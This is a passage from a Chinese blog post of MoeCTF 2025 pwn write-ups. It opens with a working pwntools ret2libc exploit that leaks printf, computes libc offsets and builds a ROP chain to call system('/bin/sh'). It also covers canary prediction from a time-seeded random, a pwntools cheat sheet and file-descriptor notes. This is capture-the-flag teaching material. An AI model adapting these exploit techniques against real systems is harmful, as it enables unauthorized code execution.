class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]  <span class="comment"># 如果你用 tmux（推荐）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接启动 gdb 调试</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(io, <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b *(main+84)</span></span><br><span class="line"><span class="string">b *(vuln+71)</span></span><br><span class="line"><span class="string">layout asm</span></span><br><span class="line"><span class="string">layout regs</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;the location of &#x27;printf&#x27;: &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_address = io.recvline().strip() <span class="comment"># 读取 `printf` 的地址。</span></span><br><span class="line"></span><br><span class="line">printf_address = <span class="built_in">int</span>(printf_address, <span class="number">16</span>) <span class="comment"># 转换为整数。</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_address))</span><br><span class="line"></span><br><span class="line">system_add = <span class="number">0x50d70</span></span><br><span class="line">printf_add = <span class="number">0x606f0</span></span><br><span class="line">shell_add = <span class="number">0x1D8678</span></span><br><span class="line">pop_rdi_ret_add = <span class="number">0x2a3e5</span></span><br><span class="line">ret_add = <span class="number">0x404f0</span></span><br><span class="line"></span><br><span class="line">system_address  = printf_address  + system_add - printf_add</span><br><span class="line">shell_address = printf_address + shell_add - printf_add</span><br><span class="line">pop_rdi_ret = printf_address + pop_rdi_ret_add - printf_add</span><br><span class="line">ret = printf_address + ret_add - printf_add</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">64</span>)  <span class="comment"># 填充 buffer</span></span><br><span class="line">payload += cyclic(<span class="number">8</span>)  <span class="comment"># 填充 rbp</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret)  <span class="comment"># 先调用 pop rdi; ret</span></span><br><span class="line">payload += p64(shell_address)  <span class="comment"># 弹出 shell_address 到 rdi</span></span><br><span class="line">payload += p64(ret)  <span class="comment"># 栈对齐</span></span><br><span class="line">payload += p64(system_address)  <span class="comment"># 跳转到 system</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()                    <span class="comment"># 手动接收 flag。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h3><p><img src="/../images/MoeCTF%202025-95.png" alt="image-20250911121056952"></p>
+<p>31 行：需要 v6 等于 0，同时 v5 等于 canary</p>
+<h2 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">process()           <span class="comment"># 创建本地进程对象</span></span><br><span class="line">remote(IP,port)     <span class="comment"># 创建远程连接对象（TCP/UDP）</span></span><br><span class="line">listen()            <span class="comment"># 创建监听端口（用于反向连接）</span></span><br><span class="line"></span><br><span class="line">recv(n)             <span class="comment"># 接收 n 个字节</span></span><br><span class="line">recvline()          <span class="comment"># 接收一行数据（直到换行符） </span></span><br><span class="line">recvall()           <span class="comment"># 接收所有数据直到 EOF</span></span><br><span class="line">recvrepeat(timeout) <span class="comment"># 接收数据直到超时</span></span><br><span class="line"></span><br><span class="line">send()                <span class="comment"># 发送数据   </span></span><br><span class="line">sendline()            <span class="comment"># 发送一行数据（带换行符）</span></span><br><span class="line">sendafter(delim,data) <span class="comment"># 在收到delim后发送data</span></span><br><span class="line">sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line">u64()   <span class="comment"># 字节流转换成64位无符号整数</span></span><br><span class="line">u32()   <span class="comment"># 字节流转换成32位无符号整数</span></span><br><span class="line">p64()   <span class="comment"># 64位无符号整数转换为8字节的字节流</span></span><br><span class="line">p32()   <span class="comment"># 32位无符号整数转换为4字节的字节流</span></span><br><span class="line"></span><br><span class="line">process.interactive()    <span class="comment"># 进入交互模式（获得Shell之后）    </span></span><br></pre></td></tr></table></figure>
+
+<p>举例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                    <span class="comment"># 导入 pwntools。</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) <span class="comment"># 一些基本的配置。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)             # 在本地运行程序。</span></span><br><span class="line"><span class="comment"># gdb.attach(io)                    # 启动 GDB</span></span><br><span class="line">io = connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">53216</span>)    <span class="comment"># 与在线环境交互。</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;114511&#x27;</span>)              <span class="comment"># 什么时候用 send 什么时候用 sendline？</span></span><br><span class="line"></span><br><span class="line">payload  = p32(<span class="number">0xdeadbeef</span>)          <span class="comment"># p32(0xdeadbeef)、b&quot;\xde\xad\xbe\xef&quot;、b&quot;deadbeef&quot; 有什么区别？</span></span><br><span class="line">                                    <span class="comment"># 你看懂原程序这里的检查逻辑了吗？</span></span><br><span class="line">payload += <span class="string">b&#x27;shuijiangui&#x27;</span>           <span class="comment"># strcmp</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;password.&#x27;</span>, payload) <span class="comment"># 发送！通过所有的检查。</span></span><br><span class="line"></span><br><span class="line">io.interactive()                    <span class="comment"># 手动接收 flag。</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                    <span class="comment"># 导入 pwntools。</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) <span class="comment"># 一些基本的配置。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">54174</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Here is the hint.&quot;</span>)</span><br><span class="line">data = io.recvn(<span class="number">8</span>)     <span class="comment"># 接收八个字节数据</span></span><br><span class="line"></span><br><span class="line">num = u64(data)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(num).encode())  <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/../images/MoeCTF%202025-96.png" alt="image-20250911122429407"></p>
+<p>随机种子：</p>
+<ul>
+<li>srandom(v0) 使用 time(0LL)（当前时间戳，单位秒）作为种子。</li>
+<li>这意味着 canary &#x3D; (int)random() % 114514 的值在程序启动时是可预测的（取决于启动时间）。</li>
+</ul>
+<p>时间依赖：</p>
+<ul>
+<li>由于 time(0LL) 返回的是一秒级的时间戳，多次快速启动程序可能得到相同的种子。</li>
+<li>这为 canary 的猜测提供了机会。</li>
+</ul>
+<h2 id="Linux知识"><a href="#Linux知识" class="headerlink" title="Linux知识"></a>Linux知识</h2><h3 id="文件描述符fd"><a href="#文件描述符fd" class="headerlink" title="文件描述符fd"></a>文件描述符fd</h3><p>当进程打开新文件时，内核会：</p>
+<ul>
+<li><p>在进程的文件描述符表中查找第一个空闲位置</p>
+</li>
+<li><p>将该位置的索引作为fd返回</p>
+</li>
+<li><p>在系统级打开文件表中创建相应条目</p>
+</li>
+</ul>
+<p>特殊fd：</p>
+<ul>
+<li>0：<code>stdin</code></li>
+<li>1：<code>stdout</code></li>
+<li>2：<code>stderr</code></li>
+</ul>
+<p>相关系统调用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打开文件，返回fd</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>; </span><br><span class="line"><span class="comment">// 关闭fd</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">close</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="comment">// 从fd读取</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>; </span><br><span class="line"><span class="comment">// 写入fd</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dup</span><span class="params">(<span class="type">int</span> oldfd)</span>;             <span class="comment">// 复制fd</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dup2</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd)</span>; <span class="comment">// 复制fd到指定值</span></span><br></pre></td></tr></table></figure>
+
+
+
+</article>
+
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/MoeCTF%202025-2/">MoeCTF 2025 Misc</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/MoeCTF%202025-1/">MoeCTF 2025 Reverse</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">stone0721</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hellopwn"><span class="toc-text">hellopwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-u64"><span class="toc-text">ez_u64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find-it"><span class="toc-text">find_it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZtext"><span class="toc-text">EZtext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezshellcode"><span class="toc-text">ezshellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prelibc"><span class="toc-text">prelibc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#boom"><span class="toc-text">boom</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwntools"><span class="toc-text">Pwntools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E7%9F%A5%E8%AF%86"><span class="toc-text">Linux知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6fd"><span class="toc-text">文件描述符fd</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
